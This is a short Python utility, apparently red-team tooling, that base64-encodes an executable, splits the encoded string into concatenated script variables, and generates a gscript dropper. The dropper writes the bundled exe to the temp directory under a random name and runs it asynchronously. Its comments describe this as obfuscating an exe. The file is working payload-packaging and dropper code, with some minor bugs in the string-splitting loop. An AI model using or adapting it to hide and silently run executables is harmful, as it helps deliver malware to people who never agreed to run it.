import sys
import base64
from string import Template

def usage():
    print("usage: -e: convert exe to output file specified /n Example:convert.py myexe.exe encoded.txt")
    sys.exit(0)

# Convert exe to base 64 encoded string and save to the specifed output file
def exe_to_b64_txt(exe_file_path, output_file):
    try:
        f = open(exe_file_path, mode='rb')
        new_file = open(output_file, "w")
        raw_bin = f.read()
        encoded_bin = base64.b64encode(raw_bin)
        new_file.write(str(encoded_bin))
        return
    except Exception as exc:
        print(f"there was an error {exc.args[0]} converting {exe_file_path} to base 64 text")
        return

# Breaks up long strings into the specified length and concatenates to the specified var_name
# optionally, can be saved to an outfile. 
# optionally, can change concatenation type depending on language
def line_breaker(full_string, line_length, var_name, outfile="", concat_type="+"):
    line_length = int(line_length)
    broken_string = str(var_name) + ' = '
    if concat_type == "+=":
        while (len(full_string)%line_length) > 0:
            sub_string = full_string[0:line_length]
            broken_string = broken_string + "\"" + sub_string + "\"" + '\n'
            broken_string = broken_string + var_name + ' += '
            full_string = full_string[line_length:]
        broken_string += "\"\""
    elif concat_type == "+":
        while (len(full_string)%line_length) > 0:
            sub_string = full_string[0:line_length]
            broken_string = broken_string + var_name + " + \"" + sub_string + "\"" + '\n'
            broken_string = broken_string + var_name + ' = '
            full_string = full_string[line_length:]
        broken_string += "\"\""
    if (len(outfile) > 0):
        f = open(outfile, "w")
        f.write(broken_string)
    else:
        print(broken_string)

# loads string from file
def string_loader(f):
    f = open(f, "r")
    file_contents = f.read()
    return file_contents

# Autmomatically generate a gscript which obfuscates an exe
def generate_gscript_exe(exe_path, outfile):
    gscript = Template('\n// ATT&CK: \n//import:$import_file \n//go_import:os as os2\n\nfunction Deploy() {\nvar bin = GetAssetAsBytes(\"$import_file\");\nvar temppath = os2.TempDir();\nvar naming = G.rand.GetAlphaString(4);\nnaming = naming.toLowerCase();\nfullpath = temppath+"\\\\"+naming+".exe";\nerrors = G.file.WriteFileFromBytes(fullpath, bin[0]);\nvar running = G.exec.ExecuteCommandAsync(fullpath, [""]);\nreturn true;\n}')
    script = gscript.safe_substitute(import_file=exe_path)
    f = open(outfile, "w")
    f.write(script)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        usage()
    
    if (sys.argv[1] == "-e" and len(sys.argv) > 3):
        exe_to_b64_txt(sys.argv[2], sys.argv[3])

    if (sys.argv[1] == "-b" and len(sys.argv) > 4):
        if len(sys.argv) > 5:
            line_breaker(string_loader(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5])
        else:
            line_breaker(string_loader(sys.argv[2]), sys.argv[3], sys.argv[4])

    if (sys.argv[1] == "-g" and len(sys.argv) > 3):
        generate_gscript_exe(sys.argv[2], sys.argv[3])